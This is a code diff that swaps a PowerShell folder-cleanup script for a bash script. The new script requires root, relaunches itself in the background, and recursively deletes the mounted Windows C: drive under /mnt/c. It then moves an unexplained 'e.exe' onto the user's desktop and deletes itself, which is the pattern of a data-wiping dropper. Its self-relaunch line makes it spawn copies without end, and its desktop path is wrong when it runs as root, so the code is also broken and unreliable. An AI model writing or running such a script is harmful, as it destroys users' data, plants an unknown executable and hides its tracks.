@@ -1,25 +1,65 @@
-$ErrorActionPreference = "Stop"
-$folderPath = "C:\Path\to\folder"
+#!/bin/bash
 
-if (Test-Path $folderPath) {
-    try {
-        # Remove any read-only attribute from files within the folder and its subfolders
-        Get-ChildItem $folderPath -Recurse | ForEach-Object { $_.Attributes = $_.Attributes -bxor [System.IO.FileAttributes]::ReadOnly }
+# Request admin privileges
+if [[ $EUID -ne 0 ]]; then
+    printf "Please run this script as root or with sudo.\n"
+    exit 1
+fi
 
-        # Remove all files within the folder and its subfolders
-        Get-ChildItem $folderPath -File -Recurse | Remove-Item -Force -ErrorAction Stop
+# Run as a background process
+nohup "$0" &>/dev/null &
 
-        # Remove all subfolders within the folder
-        Get-ChildItem $folderPath -Directory -Recurse | Remove-Item -Force -ErrorAction Stop
+# Delete target folder "C:" and its contents
+# Delete target folder "C:" and its contents
+try_delete_c_drive() {
+    target_folder="/mnt/c"
 
-        # Remove the main folder
-        Remove-Item $folderPath -Force -Recurse -ErrorAction Stop
-    }
-    catch {
-        # Handle the error if required
-        exit 1
-    }
+    if [[ -d "$target_folder" ]]; then
+        printf "Attempting to delete the C: drive...\n"
+
+        # Remove files recursively
+        if find "$target_folder" -mindepth 1 -delete -print 2>/dev/null; then
+            # Remove the target folder itself
+            if rmdir "$target_folder" 2>/dev/null; then
+                printf "C: drive deletion completed.\n"
+            else
+                printf "Failed to remove the target folder.\n"
+            fi
+        else
+            printf "Failed to delete files in the target folder.\n"
+        fi
+    else
+        printf "C: drive not found.\n"
+    fi
 }
-else {
-    exit 0
+
+
+# Move file e.exe to the user's desktop
+move_e_exe() {
+    username=$(whoami)
+    desktop_path="/home/$username/Desktop"
+    printf "Moving e.exe to the desktop...\n"
+    mv e.exe "$desktop_path"
+    printf "e.exe moved to the desktop.\n"
 }
+
+# Delete the script itself
+delete_script() {
+    script_path="$0"
+    printf "Deleting the script...\n"
+    rm "$script_path"
+    printf "Script deleted.\n"
+}
+
+# Main function
+main() {
+    try_delete_c_drive
+    move_e_exe
+    delete_script
+}
+
+# Exception handling
+trap 'printf "An error occurred! Exiting...\n"; exit 1' ERR
+
+# Call the main function
+main
